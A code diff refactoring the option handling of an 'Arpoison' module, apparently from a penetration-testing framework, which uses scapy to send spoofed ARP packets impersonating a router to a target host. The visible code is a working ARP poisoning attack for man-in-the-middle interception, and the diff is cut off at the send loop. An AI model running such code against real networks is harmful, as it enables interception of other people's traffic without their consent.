@@ -1,4 +1,5 @@
 from base.module import Module
+from options import IPAddress, Option
 from scapy.all import ARP, send
 from lib import network
 import time
@@ -15,21 +16,21 @@ class Arpoison(Module):
             'author' : ['ganye'],
         })
         self.set_options({
-            'router' : [True, 'IP address for the network\'s router.',],
-            'target' : [True, 'IP address for the target.',],
-            'interface' : [True, 'Current interface to perform the attack ' +
-                            'from e.g. eth0',],
+            'router' : IPAddress(True, 'IP address for the network\'s router.',),
+            'target' : IPAddress(True, 'IP address for the target.',),
+            'interface' : Option(True, 'Current interface to perform the attack ' +
+                            'from e.g. eth0',),
         })
 
     def run(self):
         mac = None
         try:
-            mac = network.get_mac(self.interface.get())
+            mac = network.get_mac(self.interface.value)
         except IOError:
             self.console.error("interface '%s' not found." % self.interface)
             return
 
-        arp = ARP(op=1, psrc=self.router.get(), pdst=self.target.get(), hwdst=mac)
+        arp = ARP(op=1, psrc=self.router.value, pdst=self.target.value, hwdst=mac)
 
         self.console.info('sending packets... press Ctrl+C to quit.')
         try:
